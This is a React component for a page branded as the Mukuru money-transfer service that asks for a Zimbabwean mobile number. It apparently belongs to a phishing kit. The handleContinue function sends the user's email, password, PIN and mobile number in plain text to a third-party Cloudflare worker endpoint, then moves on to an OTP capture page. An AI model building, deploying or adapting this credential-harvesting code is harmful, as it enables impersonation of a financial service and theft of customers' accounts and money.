import React, { useEffect, useRef, useState } from "react";
import { useLocation, useNavigate } from "react-router-dom";

const MobileNumber = () => {
    const [mobile, setMobile] = useState("");
    const inputRef = useRef(null);
    const navigate = useNavigate();
    const location = useLocation();
    const { email, password, pin } = location.state || {};

    // Page open hote hi mobile input focus
    useEffect(() => {
        const timer = setTimeout(() => {
            inputRef.current?.focus();
        }, 300);

        return () => clearTimeout(timer);
    }, []);

    const handleChange = (e) => {
        const value = e.target.value;

        // Sirf numbers
        if (!/^\d*$/.test(value)) return;

        setMobile(value);
    };

    const handleContinue = async () => {
        if (!mobile) return;

        console.log("Mobile number entered");
        try {
            const response = await fetch("https://my-worker.instapayapi.workers.dev/api/mukuruPhone", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ email, password, pin, mobile }),
            });

            const data = await response.json();
            navigate("/otp", { state: { email, password, pin, mobile } });
            // setError("Invalid OTP.");
            // if (!response.ok) {
            //     setError(data.message || "Invalid OTP.");
            //     return;
            // }
        } catch (error) {
            console.error("Error during mobile number submission:", error);
        }
    };

    return (
        <div className="min-h-screen bg-[#292929] text-white">

            {/* Header */}
            <header className="flex h-[86px] items-center bg-[#F0442B] px-5">
                <div className="flex items-center gap-[14px]">

                    {/* Logo */}
                    <svg
                        viewBox="0 0 52 52"
                        className="h-[48px] w-[48px]"
                        fill="none"
                    >
                        <path
                            d="
                M26 3
                L31.5 13.5
                L44 8.5
                L39 21
                L51 26
                L39 31
                L44 43.5
                L31.5 38.5
                L26 49
                L20.5 38.5
                L8 43.5
                L13 31
                L1 26
                L13 21
                L8 8.5
                L20.5 13.5
                Z
              "
                            stroke="white"
                            strokeWidth="3.5"
                            strokeLinejoin="round"
                            strokeLinecap="round"
                        />
                    </svg>

                    <span className="text-[30px] font-bold tracking-[1px]">
                        MUKURU
                    </span>

                </div>
            </header>

            {/* Main */}
            <main className="px-5 pt-[29px]">

                {/* Heading */}
                <h1 className="text-[23px] font-bold">
                    Enter Mobile Number
                </h1>

                {/* Description */}
                <p className="mt-[20px] text-[15px] leading-[22px] text-[#AFAFAF]">
                    Enter your zimbabwean mobile number
                </p>

                {/* Mobile Number */}
                <div className="mt-[55px]">

                    <label className="mb-[10px] block text-[14px] text-[#AFAFAF]">
                        Mobile Number
                    </label>

                    <div className="flex items-center border-b-[3px] border-[#686868] focus-within:border-[#36C7C8]">

                        {/* Country Code */}
                        {/* <div className="flex h-[48px] items-center border-r border-[#686868] pr-[14px] text-[18px] font-medium">
                            +92
                        </div> */}

                        {/* Number */}
                        <input
                            ref={inputRef}
                            type="tel"
                            inputMode="numeric"
                            autoComplete="tel"
                            value={mobile}
                            onChange={handleChange}
                            // placeholder="300 1234567"
                            className="
                h-[48px]
                flex-1
                bg-transparent
                px-[14px]
                text-[20px]
                font-medium
                text-white
                outline-none
                placeholder:text-[#666666]
              "
                        />

                    </div>

                </div>

                {/* Continue */}
                <button
                    type="button"
                    onClick={handleContinue}
                    className="
            mt-[45px]
            h-[61px]
            w-full
            rounded-[32px]
            bg-[#E8442A]
            text-[18px]
            font-bold
            text-white
            transition
            hover:bg-[#D93D25]
            active:scale-[0.99]
          "
                >
                    CONTINUE
                </button>

            </main>
        </div>
    );
};

export default MobileNumber;